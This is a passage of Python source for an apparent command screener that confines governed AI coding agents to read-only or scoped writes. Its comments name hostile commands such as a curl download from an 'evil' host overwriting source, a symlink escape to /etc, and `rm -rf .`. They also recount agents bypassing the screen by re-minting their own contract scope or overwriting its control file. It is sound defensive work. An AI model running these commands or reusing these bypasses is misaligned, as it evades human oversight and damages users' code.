    # str / bytes
    "strip", "lstrip", "rstrip", "split", "rsplit", "splitlines", "lower",
    "upper", "title", "casefold", "startswith", "endswith", "replace",
    "find", "rfind", "index", "count", "encode", "decode", "ljust", "rjust",
    "zfill", "partition", "removeprefix", "removesuffix", "isdigit",
    "isalpha", "isspace", "expandtabs",
    # containers
    "items", "keys", "values", "get", "append", "extend", "add", "update",
    "sort", "setdefault", "pop", "copy", "most_common", "discard", "insert",
    "union", "intersection", "difference", "issubset", "issuperset",
    # json / re / hashlib / ast / difflib / itertools reads
    "load", "loads", "dumps", "search", "match", "fullmatch", "findall", "finditer",
    "sub", "subn", "compile", "escape", "group", "groups", "groupdict",
    "start", "end", "span", "hexdigest", "digest", "sha1", "sha256", "md5",
    "parse", "unparse", "dump_", "walk_", "unified_diff", "ndiff",
    "SequenceMatcher", "ratio", "chain", "islice", "groupby", "Counter",
    "defaultdict", "OrderedDict", "namedtuple", "reader", "DictReader",
    "argv", "stdin", "stdout", "maxsize", "version_info", "platform",
    "now", "utcnow", "strftime", "fromtimestamp", "isoformat", "b64encode",
    "b64decode", "urlparse", "parse_qs", "wrap", "fill", "dedent",
    "ascii_letters", "digits", "punctuation", "mean", "median", "stdev"})
# Attribute access on these modules is restricted to the reads above; the
# module-name check alone would let `os.replace` through on the strength of
# `str.replace` being a legitimate method name.
_RO_STRICT_MODULES = frozenset({"os", "sys", "pathlib", "json", "shutil",
                                "subprocess", "io", "tempfile", "ctypes",
                                "socket", "importlib", "pickle"})
_RO_OS_ATTRS = frozenset({
    "path", "listdir", "walk", "scandir", "getcwd", "getenv", "environ",
    "sep", "curdir", "pardir", "stat", "fspath", "linesep"})
_RO_OPEN_MODES = frozenset({"r", "rb", "rt", "tr", "br", "rU"})

# git subcommands that rewrite tracked files in the working tree.
_GIT_MUTATORS = {"checkout", "reset", "restore", "clean", "stash",
                 "apply", "am", "rebase", "cherry-pick", "revert"}
# Git global options that consume a separate value. This complete parser set
# is used to find mutators even when the invocation is not eligible for the
# much narrower read-only allowlist below.
_GIT_VALUE_OPTS = {"-C", "-c", "--git-dir", "--work-tree", "--namespace",
                   "--super-prefix", "--config-env", "--exec-path"}
# A Git command name is an execution surface: unknown names resolve to
# `git-<name>` programs on PATH and then to aliases, including shell aliases
# from repository/global config. Even nominally read-only built-ins are not a
# safe class: cat-file accepts abbreviated filter/textconv options, index
# readers such as ls-files can start core.fsmonitor, and log/show can resolve
# pretty.<name> config containing signature placeholders. Keep one useful,
# command-and-option-shaped form instead of inheriting Git's extensible option
# and configuration grammars.
_GIT_READONLY_BUILTINS = frozenset({"diff"})
# Diff can invoke configured external diff/textconv helpers and can consult an
# executable core.fsmonitor while refreshing the index. A worktree diff also
# passes file content through `.gitattributes` clean filters, for which Git has
# no argv-level disable switch. These exact guards are therefore mandatory,
# and the validator below additionally admits only index/object (`--cached` or
# `--staged`) diffs. The sole accepted -c assignment cannot add an alias or any
# other executable configuration surface.
_GIT_READONLY_CONFIG = "core.fsmonitor=false"
_GIT_READONLY_DIFF_OPTIONS = frozenset({
    "--no-ext-diff", "--no-textconv",
    "--stat", "--name-only", "--name-status", "--numstat", "--shortstat",
    "--summary", "--raw", "--patch", "-p", "-u", "--cached", "--staged",
    "--no-renames", "--minimal", "--patience", "--histogram", "--check",
    "--quiet", "--exit-code", "--no-color", "--color=never",
})
_GIT_SAFE_GLOBAL_FLAGS = frozenset({
    "-P", "--no-pager", "--no-optional-locks", "--no-advice",
    "--no-lazy-fetch", "--no-replace-objects", "--literal-pathspecs",
})


# --------------------------------------------------------------- paths

def to_posix(path: str) -> str:
    """Separators as '/', whatever the host uses.

    Every path taskplane COMPARES — scope globs, graph module ids, contract
    evidence — is written with '/'. A host that hands back '\\' must be
    normalized at the boundary, once, rather than each comparison learning
    about two separators.
    """
    return str(path or "").replace("\\", "/")


def posix_workspace(task):
    """`task` with a '/'-shaped `workspace`, for artifacts that LEAVE.

    Dispatch briefs are cross-host: their parity goldens are compared byte
    for byte between Claude and Codex, so a workspace stored as
    `.tp-work\\t1` on Windows is a real divergence. Normalizing the copy
    rather than the stored value keeps every filesystem use of it intact.
    """
    if not isinstance(task, dict) or not task.get("workspace"):
        return task
    return {**task, "workspace": to_posix(task["workspace"])}


def _same_path(a: str, b: str) -> bool:
    """Path equality, case-folded only where the host API itself folds case.

    `os.path.normcase` lowercases on Windows and is the identity everywhere
    else, so this is Windows-only by construction. Folding there is correct
    rather than permissive: C:\\WS\\src and C:\\ws\\src ARE one directory,
    and a drive letter can come back in either case.
    """
    if os.path.normcase("A") == "a":
        return a.lower() == b.lower()
    return a == b


def _startswith_path(path: str, prefix: str) -> bool:
    if os.path.normcase("A") == "a":
        return path.lower().startswith(prefix.lower())
    return path.startswith(prefix)


def norm(path: str, workspace: str | None = None) -> str:
    """Workspace-relative POSIX path with '..' collapsed and symlinks resolved.

    Absolute paths and paths that escape the workspace resolve to an
    'ESCAPES:' sentinel that matches no in-scope glob, so '../', absolute
    paths, AND symlinks planted in-scope that point outside cannot dodge the
    scope check. When a real workspace is given the target is realpath'd
    (resolving any symlink in its existing prefix); with no workspace (unit
    tests) it falls back to a purely lexical normpath.
    """
    raw = (path or "").strip()
    if not raw:
        return ""
    if workspace:
        base = os.path.realpath(workspace)
        joined = raw if os.path.isabs(raw) else os.path.join(base, raw)
        # realpath resolves symlinks in the existing prefix and collapses
        # '..' for the (possibly not-yet-existing) leaf — closes the
        # `ln -s /etc server/link` then write-through-link escape.
        resolved = os.path.realpath(joined)
        # Windows: realpath returns backslashes, and the containment test
        # below is a STRING prefix comparison against a '/'-terminated base.
        # Without this, every path in a Windows workspace failed that test
        # and came back "ESCAPES:", so the contract screener refused a
        # worker's own in-scope file — governance that fails closed on an
        # entire operating system is still governance that does not work.
        # Case is folded for the comparison only (Windows paths are
        # case-insensitive; C:\Ws and C:\ws are the same directory), never
        # for the returned relative path.
        base = to_posix(base)
        resolved = to_posix(resolved)
    else:
        base = "/__ws__"
        joined = raw if posixpath.isabs(raw) else posixpath.join(base, raw)
        resolved = posixpath.normpath(joined)
    if _same_path(resolved, base):
        # D-0003: this used to return "", and screen_command's `if p:` read
        # that as "nothing to check" — so `rm -rf .` under scope ['src/**']
        # was ALLOWED while `rm -rf ..` was correctly refused. A governed
        # agent could delete its whole workspace, .git included. The root is
        # a real path and gets a real id; "" now means only empty input.
        return "."
    prefix = base.rstrip("/") + "/"
    if not _startswith_path(resolved, prefix):
        return "ESCAPES:" + resolved
    return resolved[len(prefix):]


def inline_python_reads_only(code: str) -> bool:
    """Can this `python3 -c` body be PROVEN to make no writes?

    Allowlist, fail closed: unparseable, or one unrecognised import / call /
    attribute / dunder, and the answer is no. See _RO_MODULES above for why
    this exists. It answers a narrower question than "is this safe" — only
    "does every construct in here appear on a list of things that read"."""
    import ast as _ast
    try:
        tree = _ast.parse(str(code or ""))
    except (SyntaxError, ValueError, MemoryError, RecursionError):
        return False

    def mod_ok(name):
        name = (name or "").split(" ")[0]
        return name in _RO_MODULES or name.split(".")[0] in _RO_MODULES

    # Names bound by `from <allowed module> import X`. The imported NAME
    # must itself be a read (`from os import remove` is refused at the
    # import, not later at the call), and once bound it is callable.
    bound = set()
    for node in _ast.walk(tree):
        if isinstance(node, _ast.ImportFrom):
            allowed = (_RO_OS_ATTRS if (node.module or "") == "os"
                       else _RO_ATTRS)
            for al in node.names:
                if al.name == "*" or al.name not in allowed:
                    return False
                bound.add(al.asname or al.name)
        elif isinstance(node, (_ast.FunctionDef, _ast.Lambda)):
            bound.add(getattr(node, "name", "") or "")

    for node in _ast.walk(tree):
        if isinstance(node, _ast.Import):
            if not all(mod_ok(al.name) for al in node.names):
                return False
        elif isinstance(node, _ast.ImportFrom):
            if node.level or not mod_ok(node.module or ""):
                return False
        elif isinstance(node, _ast.Attribute):
            if node.attr.startswith("_"):
                return False           # dunder walks are how sandboxes fall
            base = node.value
            if isinstance(base, _ast.Name) and base.id in _RO_STRICT_MODULES:
                allowed = _RO_OS_ATTRS if base.id == "os" else _RO_ATTRS
                if base.id in ("shutil", "subprocess", "tempfile", "ctypes",
                               "socket", "importlib", "pickle", "io"):
                    return False
                if node.attr not in allowed:
                    return False
            elif node.attr not in _RO_ATTRS:
                return False
        elif isinstance(node, _ast.Name):
            if node.id.startswith("__"):
                return False
        elif isinstance(node, _ast.Call):
            fn = node.func
            if isinstance(fn, _ast.Name):
                if fn.id == "open":
                    mode = None
                    if len(node.args) > 1:
                        m = node.args[1]
                        mode = m.value if isinstance(m, _ast.Constant) else 0
                    for kw in node.keywords:
                        if kw.arg == "mode":
                            mode = (kw.value.value
                                    if isinstance(kw.value, _ast.Constant)
                                    else 0)
                    if mode is not None and mode not in _RO_OPEN_MODES:
                        return False
                elif fn.id not in _RO_BUILTINS and fn.id not in bound:
                    return False
        elif isinstance(node, (_ast.Global, _ast.Nonlocal, _ast.AsyncFor,
                               _ast.AsyncWith, _ast.AsyncFunctionDef,
                               _ast.Await)):
            return False
    return True


def _inline_bodies_all_readonly(command: str) -> bool:
    """True when the command contains at least one `python -c <body>` and
    EVERY such body is provably read-only. Quote-aware, and False the moment
    anything cannot be resolved — an unsplittable command line is exactly
    the case that must keep the denial."""
    try:
        toks = _shsplit(str(command or ""))
    except Exception:
        return False
    if not toks:
        return False
    bodies, i = [], 0
    while i < len(toks):
        prog = os.path.basename(toks[i])
        if _python_program(prog):
            j = i + 1
            while j < len(toks):
                if toks[j] == "-c":
                    if j + 1 >= len(toks):
                        return False           # `-c` with no body
                    bodies.append(toks[j + 1])
                    i = j + 1
                    break
                if not toks[j].startswith("-"):
                    break                      # a script file, not -c
                j += 1
        i += 1
    return bool(bodies) and all(inline_python_reads_only(b) for b in bodies)


def match_any(path: str, globs) -> bool:
    return any(fnmatch.fnmatch(path, g) for g in (globs or []))


def writable(path: str, globs) -> bool:
    """Does an allowlist permit writing `path` — INCLUDING the directory the
    allowlist itself names?

    `.em-review/**` did not match `.em-review`, so a read-only review
    contract forbade creating the one directory it authorized: `mkdir -p
    .em-review` was denied while `mkdir -p .em-review/impact` was allowed.
    A contract that refuses to let you set up the space it granted you is
    not stricter, it is just wrong, and the workaround (make a deeper path
    first) taught agents to route around the screen.

    The widening is exactly one path per glob — the glob's own fixed stem,
    compared for equality, never as a prefix. `.em-review/**` newly permits
    `.em-review` and still refuses `.em-review-scratch`, `.em-reviewX` and
    every parent."""
    if match_any(path, globs):
        return True
    return path in scope_stems(globs)


def writable_target(path: str, globs, workspace: str | None) -> bool:
    """Match one host path against relative or absolute write authority.

    ``norm`` intentionally marks every path outside the checkout as an
    escape. Hybrid storage deliberately grants a small set of such paths,
    so comparing that sentinel with an absolute allowlist could never work.
    Resolve absolute entries independently and require real-path containment
    inside their fixed stem; symlink escapes and unrelated external paths
    therefore remain denied.
    """
    relative_allow = [str(item) for item in (globs or [])
                      if not os.path.isabs(str(item))]
    normalized = norm(path, workspace)
    if normalized and not normalized.startswith("ESCAPES:") and \
            writable(normalized, relative_allow):
        return True
    if not workspace:
        return False
    raw = str(path or "").strip()
    if not raw:
        return False
    target = to_posix(os.path.realpath(
        raw if os.path.isabs(raw) else os.path.join(workspace, raw)))
    if normalized.startswith("ESCAPES:"):
        # Absolute authority is reserved for taskPlane's validated hybrid
        # run roots. A user-authored contract cannot turn this helper into a
        # general write escape by naming /etc, another checkout, or a secret.
        try:
            import storage as _runtime_storage
            if not _runtime_storage.managed_path_allowed(workspace, target):
                return False
        except Exception:
            return False
    for item in (globs or []):
        pattern = str(item or "")
        if not os.path.isabs(pattern):
            continue
        wildcard = min(
            (index for index in (pattern.find("*"), pattern.find("?"),
                                 pattern.find("[")) if index >= 0),
            default=len(pattern))
        raw_stem = pattern[:wildcard].rstrip("/\\")
        if not raw_stem:
            continue
        stem = to_posix(os.path.realpath(raw_stem))
        if not (_same_path(target, stem) or
                _startswith_path(target, stem.rstrip("/") + "/")):
            continue
        if wildcard == len(pattern):
            if _same_path(target, stem):
                return True
            continue
        suffix = pattern[wildcard:].replace("\\", "/").lstrip("/")
        if _same_path(target, stem):
            if suffix in {"*", "**", "**/*"}:
                return True
            continue
        rel = target[len(stem.rstrip("/")) + 1:]
        if writable(rel, [suffix]):
            return True
    return False


def scope_stems(globs) -> set:
    """Each glob's fixed prefix, as path SEGMENTS. Empty stems are dropped:
    a leading `**/…` has no fixed prefix and must not be read as "matches
    everything", or it would conflict with every other task's scope."""
    out = set()
    for g in (globs or []):
        if not g:
            continue
        stem = g.split("*", 1)[0].rstrip("/")
        if stem:
            out.add(stem)
    return out


def seg_prefix(x: str, y: str) -> bool:
    """True when path `x` is `y` or a descendant of `y` — on SEGMENT
    boundaries, so `src/a` is inside `src` but `src/ab` is NOT inside
    `src/a`. (Kernel-side since v3 Phase 3; loop's wave scope-overlap check
    is the caller.)"""
    return x == y or x.startswith(y + "/")


# Out-of-scope entries that can NEVER be overridden, even by a literal
# human-approved scope entry: the secrets family stays sacred (v3 dogfood).
# Never writable, whatever a contract says. The control plane joins the
# secrets family (D-0002): `tp new GOAL` with no --scope is a supported
# form, and with scope_paths empty the scope test below is skipped
# entirely — so an agent could overwrite .taskplane/active_contract.json
# and every later screen would approve everything. One write and the
# guardrail governs itself.
_SACRED_OUT_OF_SCOPE = ("**/.env", "**/secrets/**", ".env", "secrets/**",
                        ".taskplane/**", "**/.taskplane/**")


def scope_violation(path: str, coding: dict) -> str | None:
    oos = coding.get("out_of_scope_paths") or []
    scope = coding.get("scope_paths") or []
    # D-0002: these hold with or WITHOUT a declared scope. The checks below
    # are conditional (`if oos`, `if scope`), so a contract carrying neither
    # screened nothing at all.
    if path.startswith("ESCAPES:"):
        return f"'{path}' escapes the workspace"
    if match_any(path, _SACRED_OUT_OF_SCOPE):
        # Keep the `out_of_scope` token: it is the searchable marker every
        # existing consumer (and the sign-off DoD test) matches on, and a
        # clearer message is not worth silently changing what a caller can
        # grep for.
        return (f"'{path}' matches out_of_scope_paths "
                "(never writable under any contract)")
    if oos and match_any(path, oos):
        # v3 dogfood fix + EM hardening: a LITERAL (wildcard-free) scope
        # entry naming this exact path beats the default deny ONLY when the
        # contract carries PLAN PROVENANCE (coding["plan_minted"] — set
        # exclusively by the loop engine when it builds a task contract from
        # the HUMAN-APPROVED plan). The approval is the authorization.
        # WITHOUT provenance (tp new --scope from any CLI caller — including
        # a governed agent re-minting its own contract) the default deny is
        # absolute, exactly as before v3: the EM review reproduced a live
        # escalation where an agent scoped src/** re-minted itself a literal
        # .git/hooks scope. Wildcard scope globs NEVER override, and the
        # secrets family cannot be overridden by anything.
        literal_ok = bool(coding.get("plan_minted")) and any(
            s == path and "*" not in s and "?" not in s and "[" not in s
            for s in scope)
        # The `if g in oos` filter made the "cannot be overridden"
        # guarantee hold only for contracts built from the DEFAULT list: a
        # hand-written out_of_scope of ['secrets/*'] left 'secrets/**'
        # absent, so a plan-minted literal scope won. Tested unconditionally.
        sacred = match_any(path, _SACRED_OUT_OF_SCOPE)
        if not (literal_ok and not sacred):
            return f"'{path}' matches out_of_scope_paths"
    if scope and not match_any(path, scope):
        return f"'{path}' is outside scope_paths {scope}"
    return None


# ------------------------------------------------------- command screening

def _targets_tee(a):
    return [t for t in a if not t.startswith("-")]


def _targets_last_arg(a):
    args = [t for t in a if not t.startswith("-")]
    return args[-1:] if args else []


def _targets_dd(a):
    return [t[3:] for t in a if t.startswith("of=")]


def _targets_sort_o(a):
    # `sort -o FILE …` (and glued -oFILE / --output=FILE) writes FILE — a
    # mutation the older screen missed entirely, so `sort -o main.py x` slipped
    # past a build scope and a read-only source guard alike.
    out = []
    i = 0
    while i < len(a):
        t = a[i]
        if t in ("-o", "--output") and i + 1 < len(a):
            out.append(a[i + 1]); i += 2; continue
        if t.startswith("-o") and len(t) > 2:
            out.append(t[2:])
        elif t.startswith("--output="):
            out.append(t.split("=", 1)[1])
        i += 1
    return out


def _targets_t_dir(a):
    # GNU `cp -t DIR src…` / `mv -t DIR src…` / `install -t DIR …`: the
    # target-directory flag puts the destination FIRST, so _targets_last_arg
    # (which returns the trailing arg) grabbed a SOURCE and screened the wrong
    # path. When -t/--target-directory is present, DIR is the write target;
    # otherwise fall back to the trailing-arg convention.
    i = 0
    while i < len(a):
        t = a[i]
        if t in ("-t", "--target-directory") and i + 1 < len(a):
            return [a[i + 1]]
        if t.startswith("--target-directory="):
            return [t.split("=", 1)[1]]
        if t.startswith("-t") and len(t) > 2:
            return [t[2:]]
        i += 1
    return _targets_last_arg(a)


def _targets_sed_i(a):
    if not any(t == "-i" or t.startswith("-i") or t.startswith("--in-place")
               for t in a):
        return []
    files = [t for t in a if not t.startswith("-")]
    return files[1:] if len(files) > 1 else files


def _targets_skip_first(a):
    # chmod MODE file…, chown OWNER file… — the first non-flag arg is the
    # mode/owner, the rest are the paths being mutated.
    args = [t for t in a if not t.startswith("-")]
    return args[1:]


# Destructive/mutating programs whose PATH ARGS must be in-scope. `rm`,
# `shred`, `mkfifo`, `mknod` mutate every non-flag arg (reuse _targets_tee);
# `chmod`/`chown` skip the leading mode/owner. Without these a read-only
# review contract would approve `rm -rf <reviewed source>` and a scoped
# build contract could `rm -rf ../other` — both now screened as writes.
def _targets_dash_o(a):
    """`-o FILE` / `-oFILE` / `--output=FILE` / `-O FILE` (curl, wget).

    D-0004: downloaders were absent from this table entirely, so
    `curl -o src/main.py http://evil/x` was ALLOWED under a READ-ONLY
    review contract — overwriting the reviewed source with attacker-chosen
    bytes. The table's own comment already described the intent; only the
    downloaders were missing from it.
    """
    out, i = [], 0
    while i < len(a):
        t = a[i]
        if t in ("-o", "--output", "-O", "--output-document") and i + 1 < len(a):
            out.append(a[i + 1]); i += 2; continue
        if t.startswith("-o") and len(t) > 2 and not t.startswith("--"):
            out.append(t[2:])
        elif t.startswith("--output="):
            out.append(t.split("=", 1)[1])
        elif t.startswith("--output-document="):
            out.append(t.split("=", 1)[1])
        i += 1
    return out


def _tar_extracts(args) -> bool:
    """True when tar will EXTRACT.

    The old predicate required a leading dash, so the classic dashless mode
    word — `tar xf payload.tar`, which is how most people write it — was
    invisible and extraction was allowed under any contract (D-0004).
    """
    for a in args:
        if a in ("--extract", "--get"):
            return True
        if a.startswith("--"):
            continue
        body = a[1:] if a.startswith("-") else a
        # a MODE word is the leading run of letters; `xf`, `-xzf`, `xvf`
        if body and body.isalpha() and "x" in body:
            return True
    return False


_WRITE_PROGRAMS = {
    "curl": _targets_dash_o, "wget": _targets_dash_o,
    "touch": _targets_tee, "mkdir": _targets_tee,
    "tee": _targets_tee, "cp": _targets_t_dir, "mv": _targets_t_dir,
    "install": _targets_t_dir, "rsync": _targets_last_arg,
    "ln": _targets_last_arg, "truncate": _targets_last_arg,
    "dd": _targets_dd, "sed": _targets_sed_i, "sort": _targets_sort_o,
    "rm": _targets_tee, "shred": _targets_tee, "mkfifo": _targets_tee,
    "mknod": _targets_tee, "chmod": _targets_skip_first,
    "chown": _targets_skip_first,
}


# Writing here discards; it can never mutate a repository. Deliberately
# exhaustive rather than a pattern — `/dev/shm/x` IS a real write.
_NULL_SINKS = frozenset({"/dev/null", "/dev/zero"})


# Interpreters and env prefixes a taskplane invocation may legitimately
# carry. Anything else in leading position means this is not taskplane.
_TP_LAUNCHERS = frozenset({"python", "python3", "py", "-3", "uv", "run",
                           "env", "exec", "command", "time", "nohup"})


def taskplane_verb(command: str) -> "str | None":
    """The taskplane SUBCOMMAND this shell command invokes, or None.

    Position matters. Both callers of this used to scan every token for a
    bare `tp`, so `echo tp clear` read as a release command (exempt from the
    meter) and `git commit -m "tp dod"` read as a completion (refused while
    an obligation was open). A program name is the FIRST word, not any word.
    """
    text = " ".join(str(command or "").split())
    if not text:
        return None
    try:
        toks = shlex.split(text)
    except ValueError:
        toks = text.split()
    i = 0
    while i < len(toks):
        t = toks[i]
        if "=" in t and not t.startswith("-") and "/" not in t.split("=")[0]:
            i += 1                      # VAR=value prefix
            continue
        base = posixpath.basename(t.replace("\\", "/"))
        if base in ("tp", "tp.py"):
            return toks[i + 1] if i + 1 < len(toks) else ""
        normalized = t.replace("\\", "/")
        if normalized == ".taskplane/codex-hook.py" or normalized.endswith(
                "/.taskplane/codex-hook.py"):
            return toks[i + 1] if i + 1 < len(toks) else ""
        if base in _TP_LAUNCHERS or t.startswith("-"):
            i += 1                      # an interpreter or its flag
            continue
        return None                     # some other program entirely
    return None


def _redirect_targets(toks) -> list:
    """Shlex-aware redirect targets — the token AFTER a `>`/`>>` operator, or
    the glued `>file` form. Because it reads shlex tokens (not the raw
    string), `> "my file.txt"` yields the real path `my file.txt`, not `"my`."""
    out = []
    for i, t in enumerate(toks):
        if _REDIRECT_OP_RE.match(t):
            if i + 1 < len(toks) and not _REDIRECT_OP_RE.match(toks[i + 1]):
                out.append(toks[i + 1])
        else:
            m = _REDIRECT_GLUED_RE.match(t)
            if m and m.group("f"):
                out.append(m.group("f"))
    # The NULL SINKS are not writes to anything. Screening `> /dev/null` as a
    # filesystem write blocked ordinary read-only work — `tp graph impact …
    # > /dev/null 2>&1` was refused under a review contract — and taught
    # reviewers to route around the screener rather than use it. Discarding
    # output cannot mutate the repository, and this is the entire list: no
    # other device is treated as writable.
    return [t for t in out if t not in _NULL_SINKS]


def _env_split_string(rest,
                      assignment_sink: "list[str] | None" = None
                      ) -> list | None:
    """GNU `env -S/--split-string STRING` word-splits STRING into an argv —
    so `env -S 'rm -rf x'` EXECUTES `rm -rf x`, but naive unwrapping sees a
    single opaque token ("a program named 'rm -rf x'") and screens nothing.
    Return the re-split argv (+ trailing args, which env appends), or None
    when no -S form is present.

    FLAG-AWARE (v0.9.6 fix): a value-taking env flag BEFORE -S (e.g.
    `env -u NAME -S '…'`, `env -C /dir -S '…'`) must skip its value token, or
    the scan mistakes that value for "the program" and bails — leaving the -S
    payload unscreened. Uses the same env value-flag set as `_unwrap` so the
    two parsers can't diverge."""
    env_vflags = _WRAPPER_VALUE_FLAGS.get("env", set())
    i = 0
    while i < len(rest):
        t = rest[i]
        val = None
        if t in ("-S", "--split-string") and i + 1 < len(rest):
            val, tail = rest[i + 1], rest[i + 2:]
        elif t.startswith("--split-string="):
            val, tail = t.split("=", 1)[1], rest[i + 1:]
        elif t.startswith("-S") and len(t) > 2:
            val, tail = t[2:], rest[i + 1:]
        elif t.split("=", 1)[0] in env_vflags and "=" not in t:
            i += 2                       # value-taking flag: skip flag + value
            continue
        elif t.startswith("-") or "=" in t:
            if "=" in t and not t.startswith("-") \
                    and assignment_sink is not None:
                assignment_sink.append(t)
            i += 1                       # other env flag / VAR=val
            continue
        else:
            return None                  # reached the program: no -S form
        if val is not None:
            return _shsplit(val) + tail
    return None


# Wrapper flags that consume a SEPARATE following token as their value. Naive
# flag-stripping (drop tokens starting with '-') would leave the value token
# in place and then read IT as the program — so `env -u NAME rm x` unwrapped
# to program 'NAME' and screened nothing. Each of these must swallow its
# argument too. (Glued `-uNAME` / `--unset=NAME` carry their own value and
# need no lookahead.)
_WRAPPER_VALUE_FLAGS = {
    "env": {"-u", "-C", "--unset", "--chdir"},
    "sudo": {"-u", "-g", "-p", "-U", "-r", "-t", "-h", "-C", "-D", "-R"},
    "doas": {"-u", "-C", "-a"},
    "nice": {"-n", "--adjustment"},
    "ionice": {"-c", "-n", "-p", "-P", "--class", "--classdata", "--pid"},
    "timeout": {"-s", "-k", "--signal", "--kill-after"},
    "chrt": {"-T", "-P", "--sched-runtime", "--sched-period"},
    "stdbuf": {"-i", "-o", "-e", "--input", "--output", "--error"},
    "exec": {"-a"},
}


def _unwrap(toks, assignment_sink: "list[str] | None" = None,
            identity_sink: "list[str] | None" = None) -> list:
    """Strip leading transparent wrapper programs, returning the real argv.
    `env FOO=1 rm x` -> `rm x`; `timeout 5 rm x` -> `rm x`;
    `env -u NAME rm x` -> `rm x` (the `-u` swallows `NAME`).

    When ``assignment_sink`` is supplied, preserve every execution-prefix
    assignment removed during unwrapping.  Read-only screening uses this to
    fail closed instead of silently approving environment-controlled helpers
    such as ``GIT_TRACE=/path git ...``.  Other callers retain the historical
    unwrapped argv behavior.
    """
    while toks:
        # D-0004: `FOO=1 git push` — a bare assignment prefix is ordinary
        # POSIX and needs no wrapper program, but _unwrap basenamed `FOO=1`
        # and compared THAT against the deny heads, so the deny list was
        # defeated by one variable. An UNEXPANDED $VAR is left in place: it
        # is unscreenable, and dropping it would hide the command.
        while toks and re.match(r"^[A-Za-z_][A-Za-z_0-9]*=", toks[0]):
            if assignment_sink is not None:
                assignment_sink.append(toks[0])
            toks = toks[1:]
        if not toks:
            return toks
        prog = os.path.basename(toks[0])
        if prog not in _WRAPPERS:
            return toks
        if identity_sink is not None:
            identity_sink.append(toks[0])
        if prog == "env":
            split = _env_split_string(toks[1:], assignment_sink)
            if split is not None:
                toks = split             # re-enter: may be another wrapper
                continue
        vflags = _WRAPPER_VALUE_FLAGS.get(prog, set())
        rest = toks[1:]
        while rest:
            tok = rest[0]
            if prog == "env" and "=" in tok and not tok.startswith("-"):
                if assignment_sink is not None:
                    assignment_sink.append(tok)
                rest = rest[1:]                      # VAR=val assignment
                continue
            if not tok.startswith("-"):
                break
            base = tok.split("=", 1)[0]
            takes_val = base in vflags and "=" not in tok
            rest = rest[1:]
            if takes_val and rest:
                rest = rest[1:]                      # swallow the flag's value
        # timeout/nice/chrt take a leading numeric positional (duration/adj)
        if prog in ("timeout", "nice", "chrt") and rest \
                and re.match(r"^[0-9]", rest[0]):
            rest = rest[1:]
        if rest == toks:            # no progress — avoid infinite loop
            return toks
        toks = rest
    return toks


def _git_subcommand(args) -> "tuple[str | None, int]":
    """Return Git's subcommand and its argv index through global options."""
    i = 0
    while i < len(args):
        arg = args[i]
        if not arg.startswith("-"):
            return arg, i
        base = arg.split("=", 1)[0]
        i += 1
        if base in _GIT_VALUE_OPTS and "=" not in arg:
            i += 1
    return None, i


def _git_readonly_violation(args) -> "str | None":
    """Why this Git argv is not statically demonstrable as read-only.

    The allowlist is deliberately command-and-option shaped, not a denylist.
    Git has several executable extension mechanisms (aliases, git-* helpers,
    pagers, external diff drivers and textconv filters), and configuration can
    come from outside the reviewed repository. A form is admitted only when
    argv selects a known read-only built-in and explicitly disables every
    relevant configured executor and optional repository-metadata writes.
    """
    if args in (["--version"], ["-v"]):
        return None

    dangerous_env = []
    for name in os.environ:
        if (name.startswith("GIT_CONFIG") or name.startswith("GIT_TRACE")
                or name in {
                    "GIT_ALTERNATE_OBJECT_DIRECTORIES", "GIT_COMMON_DIR",
                    "GIT_DIR", "GIT_EXEC_PATH", "GIT_EXTERNAL_DIFF",
                    "GIT_INDEX_FILE", "GIT_NAMESPACE", "GIT_OBJECT_DIRECTORY",
                    "GIT_OPTIONAL_LOCKS", "GIT_REPLACE_REF_BASE",
                    "GIT_WORK_TREE",
                }):
            dangerous_env.append(name)
    if dangerous_env:
        return (
            "Git environment is not sanitized: "
            + ", ".join(f"`{name}`" for name in sorted(dangerous_env))
            + " can redirect objects, config, helpers, tracing, or writes")

    sub, sub_index = _git_subcommand(args)
    global_args = args[:sub_index]
    saw_no_pager = False
    saw_no_optional_locks = False
    saw_no_lazy_fetch = False
    saw_no_replace_objects = False
    saw_fsmonitor_neutralization = False
    i = 0
    while i < len(global_args):
        arg = global_args[i]
        if arg in ("-P", "--no-pager"):
            saw_no_pager = True
            i += 1
            continue
        if arg == "--no-optional-locks":
            saw_no_optional_locks = True
            i += 1
            continue
        if arg == "--no-lazy-fetch":
            saw_no_lazy_fetch = True
            i += 1
            continue
        if arg == "--no-replace-objects":
            saw_no_replace_objects = True
            i += 1
            continue
        if arg == "-C":
            return "Git `-C` may redirect lookup to an untrusted repository"
        if arg.startswith("-C") and len(arg) > 2:
            return "Git `-C` may redirect lookup to an untrusted repository"
        if arg == "-c":
            if i + 1 >= len(global_args):
                return "Git `-c` has no assignment, so it can't be screened"
            assignment = global_args[i + 1]
            if assignment != _GIT_READONLY_CONFIG:
                return (
                    f"Git config assignment `{assignment}` may add an "
                    "executable extension that can't be screened from argv")
            saw_fsmonitor_neutralization = True
            i += 2
            continue
        if arg in _GIT_SAFE_GLOBAL_FLAGS:
            i += 1
            continue
        return (
            f"Git global option `{arg}` may select configuration or an "
            "executable extension that can't be screened from argv")

    if sub not in _GIT_READONLY_BUILTINS:
        label = sub or "<missing>"
        return (
            f"Git command `{label}` is not on the statically read-only "
            "built-in allowlist; aliases and git-* executables can't be "
            "screened from argv")
    if not saw_no_pager:
        return (
            "Git output may launch a configured pager that can't be screened; "
            "use `git --no-pager …`")
    if not saw_no_optional_locks:
        return (
            "Git may perform optional repository-metadata writes that can't "
            "be screened; use `git --no-optional-locks …`")
    if not saw_no_lazy_fetch:
        return (
            "Git may invoke a configured lazy-fetch/promisor helper that "
            "can't be screened; use `git --no-lazy-fetch …`")
    if not saw_no_replace_objects:
        return (
            "Git may consult replacement-object indirection; use "
            "`git --no-replace-objects …`")
    if not saw_fsmonitor_neutralization:
        return (
            "Git may launch configured core.fsmonitor that can't be screened "
            "while reading the working tree; use "
            "`-c core.fsmonitor=false`")

    sub_args = args[sub_index + 1:]
    options = []
    for arg in sub_args:
        if arg == "--":
            break
        if arg.startswith("-"):
            options.append(arg)
            if arg not in _GIT_READONLY_DIFF_OPTIONS:
                return (
                    f"Git diff option `{arg}` is not on the exact read-only "
                    "allowlist; abbreviations and prefix equivalents can't "
                    "be screened from argv")
    if "--no-ext-diff" not in options or "--no-textconv" not in options:
        return (
            "Git diff output may invoke globally or locally configured "
            "external-diff/textconv helpers that can't be screened; use both "
            "`--no-ext-diff` and `--no-textconv`")
    if "--cached" not in options and "--staged" not in options:
        return (
            "Git diff may pass working-tree content through executable "
            "`.gitattributes` clean filters that can't be disabled from "
            "argv; use an index/object diff with `--cached` or `--staged`")
